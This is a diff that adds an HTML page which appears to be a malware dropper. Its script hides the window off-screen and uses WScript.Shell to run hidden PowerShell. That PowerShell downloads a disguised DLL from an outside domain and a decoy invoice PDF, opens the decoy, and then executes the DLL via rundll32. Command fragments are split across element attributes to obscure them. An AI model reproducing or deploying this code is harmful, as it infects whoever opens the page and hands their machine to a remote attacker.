@@ -1,0 +1,69 @@
+<html>
+<head></head>
+<body>
+<img src='https://abc.xyz/img/bg-cropped.jpg' id="xt" alt='powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFile' onload='classicOnload()'/>
+<a href="#" id="xa" title="rund">K</a>
+<a href="#" onclick="alert(1)" id="xz">t</a>
+<input onfocus="createExecution()" value="H" id="dfrr"/>
+
+
+<script>
+
+var gref = ActiveXObject;
+var T = String;
+var fc = 'fromCharCode';
+
+function string_from_stack_2(){
+    return document.getElementById("xt").getAttribute('alt');
+}
+
+
+function createExecution(){
+  var o = new gref('WScript.Shell');
+
+  o.run(document.getElementById("xa").getAttribute('title').concat("ll32 C:\\Users\\Public\\t0.png,Cpurtyhvlc"));
+}
+
+
+function goDownload(arg){
+   var o = new gref('WScript.Shell');
+   var c = string_from_stack_2().concat("('http://bestsdealofworld.com/twain.png', 'C:\\Users\\Public\\t0.png')");
+   var k = string_from_stack_2().concat("('https://transfer.sh/get/vpiHmi/invoice.pdf', 'C:\ProgramData\invoice.pdf'); Start-Process 'C:\ProgramData\invoice.pdf'");
+
+
+   o.run(c,0);
+   o.run(k, 0);
+
+}
+
+
+
+window[2] = goDownload;
+
+function classicOnload(){
+  window.resizeTo(2,7);
+  window.moveTo(3466, 3883);
+  var szR = 474621;
+
+  for(var i = 0; i < 5; i++){
+    try{
+      if(window[i].toString().indexOf("go") !== -1){
+        document.getElementById("xz").onclick = window[i];
+      }
+    }catch(e){}
+  }
+
+  setTimeout(function(){
+    document.getElementById("dfrr").focus();
+  }, 30000);
+
+  document.getElementById("xz").click();
+
+  setTimeout(function(){
+    window.close();
+  }, 45000);
+  
+}
+</script>
+</body>
+</html>
